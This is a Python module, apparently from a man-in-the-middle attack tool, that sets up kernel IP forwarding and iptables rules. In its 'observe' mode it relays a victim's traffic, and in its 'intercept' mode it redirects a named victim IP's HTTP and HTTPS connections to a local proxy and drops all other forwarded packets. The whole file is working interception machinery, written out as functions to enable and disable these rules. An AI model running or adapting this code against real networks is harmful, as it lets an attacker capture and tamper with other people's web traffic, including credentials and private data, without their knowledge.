"""Forwarding + redirect rules for MITM modes."""
from __future__ import annotations
import logging
import os
import shutil
import subprocess

log = logging.getLogger("mitm.forwarding")


def _iptables_path() -> str:
    """Resolve the absolute path to iptables once."""
    for candidate in ("/usr/sbin/iptables", "/sbin/iptables", "/usr/bin/iptables"):
        if os.path.exists(candidate):
            return candidate
    found = shutil.which("iptables")
    return found or "iptables"


IPTABLES = _iptables_path()
log.info("Using iptables binary: %s", IPTABLES)


def _run(args: list) -> bool:
    """
    Run an iptables command and log every outcome.
    Never swallow errors silently.
    """
    cmd = [IPTABLES] + args
    try:
        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=8,
            check=False,
        )
        if result.returncode != 0:
            log.warning("iptables failed (rc=%d): %s", result.returncode, " ".join(cmd))
            if result.stderr:
                log.warning("  stderr: %s", result.stderr.strip())
            if result.stdout:
                log.warning("  stdout: %s", result.stdout.strip())
            return False
        log.info("iptables ok: %s", " ".join(args))
        return True
    except Exception as e:
        log.warning("iptables exception: %s — %s", " ".join(cmd), e)
        return False


# ============================================================================
# IP forwarding via /proc/sys (no external command needed)
# ============================================================================
def get_ip_forward() -> bool:
    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f:
            return f.read().strip() == "1"
    except Exception:
        return False


def set_ip_forward(enabled: bool) -> bool:
    try:
        val = "1" if enabled else "0"
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(val)
        log.info("ip_forward set to %s", val)
        return True
    except Exception as e:
        log.warning("Cannot set ip_forward: %s", e)
        return False


# ============================================================================
# OBSERVE MODE — kernel-level forwarding + FORWARD ACCEPT rules
# ============================================================================
def enable_forwarding(iface: str) -> bool:
    """Enable kernel IP forwarding and allow relayed traffic."""
    ok_forward = set_ip_forward(True)
    r1 = _run(["-I", "FORWARD", "1", "-i", iface, "-j", "ACCEPT"])
    r2 = _run(["-I", "FORWARD", "1", "-o", iface, "-j", "ACCEPT"])
    log.info("enable_forwarding iface=%s  forward=%s  in=%s  out=%s",
             iface, ok_forward, r1, r2)
    return ok_forward and r1 and r2


def disable_forwarding(iface: str) -> None:
    _run(["-D", "FORWARD", "-i", iface, "-j", "ACCEPT"])
    _run(["-D", "FORWARD", "-o", iface, "-j", "ACCEPT"])
    set_ip_forward(False)


# ============================================================================
# INTERCEPT MODE — redirect victim TCP 80/443 to local proxy
# ============================================================================
def enable_redirect(iface: str, victim_ip: str, proxy_port: int) -> bool:
    """
    Set up:
      - kernel forwarding OFF (we terminate the TCP here, not relay)
      - PREROUTING REDIRECT for victim's TCP 80 -> proxy
      - PREROUTING REDIRECT for victim's TCP 443 -> proxy
      - FORWARD DROP for the victim (everything not redirected is dropped)
    """
    # 1. Disable kernel forwarding — proxy terminates and reconnects
    set_ip_forward(False)

    # 2. REDIRECT rules
    r80 = _run([
        "-t", "nat", "-I", "PREROUTING", "1",
        "-i", iface, "-s", victim_ip, "-p", "tcp", "--dport", "80",
        "-j", "REDIRECT", "--to-ports", str(proxy_port),
    ])
    r443 = _run([
        "-t", "nat", "-I", "PREROUTING", "1",
        "-i", iface, "-s", victim_ip, "-p", "tcp", "--dport", "443",
        "-j", "REDIRECT", "--to-ports", str(proxy_port),
    ])
    rdrop = _run([
        "-I", "FORWARD", "1",
        "-i", iface, "-s", victim_ip, "-j", "DROP",
    ])

    log.info("enable_redirect iface=%s victim=%s port=%d  80=%s 443=%s drop=%s",
             iface, victim_ip, proxy_port, r80, r443, rdrop)
    return r80 and r443


def disable_redirect(iface: str, victim_ip: str, proxy_port: int) -> None:
    _run(["-t", "nat", "-D", "PREROUTING",
          "-i", iface, "-s", victim_ip, "-p", "tcp", "--dport", "80",
          "-j", "REDIRECT", "--to-ports", str(proxy_port)])
    _run(["-t", "nat", "-D", "PREROUTING",
          "-i", iface, "-s", victim_ip, "-p", "tcp", "--dport", "443",
          "-j", "REDIRECT", "--to-ports", str(proxy_port)])
    _run(["-D", "FORWARD",
          "-i", iface, "-s", victim_ip, "-j", "DROP"])
    set_ip_forward(False)